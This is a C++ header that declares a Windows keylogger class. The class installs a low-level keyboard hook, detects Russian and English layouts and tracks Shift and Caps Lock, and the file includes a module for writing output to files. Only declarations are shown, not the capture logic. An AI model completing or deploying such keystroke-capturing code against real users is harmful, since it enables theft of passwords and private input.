#pragma once

/**
 * Standart headers: c++/os
 */
#include "windows.h"
#include <chrono>
#include <ctime>

/**
 * Custom headers
 */
#include "../Error_Logger/Error_Logger.h"
#include "../WriteFile/write_file.h"

/**
 * Macros for checking if keyboard layout is English or Russian
 */
#define Russian 0x0419
#define English 0x0409

/**
 * Macros for buffer size which equal to 512 bytes
 */
#define buf_size 1 << 9

/**
 * @class Class for hooking keyboard
 */
class key_logger
{
private:
    /**
     * @brief Hook Handle
     */
    HHOOK hHooK;

    int hooke_type;
public:
    /**
     * @brief Default Constructor
     */
    key_logger();

    /**
     * @brief Parametrized Constructor with type of hook filter
     * @param ihook_ type of hook filter
     */
    explicit key_logger( int ihook_ );

    /**
     * @brief NoCopyConstructible
     */
    key_logger( const key_logger& ) = delete;

    /**
     * @brief NoMoveConstructible
     */
    key_logger( key_logger&& ) = delete;

    /**
     * @brief NoCopyAssignable
     */
    key_logger& operator=( const key_logger& ) = delete;

    /**
     * @brief NoMoveAssignable
     */
    key_logger& operator=( key_logger&& ) = delete;

    /**
     * @brief Destructor
     */
    ~key_logger();

    /**
     * @brief Function for setting hook param
     */
    void set_hook();

    /**
     * @brief Hook filtering function
     * @param icode
     * @param w_param points that user pressed button
     * @param l_param button info
     * @return CallNextHookEx() passed hook info for the next hook
     */
    static LRESULT CALLBACK log_key( int icode, WPARAM w_param, LPARAM l_param );

    /**
     * @brief  Check if CapsLock or Shift is pressed
     */
    bool us_upper_case();

};
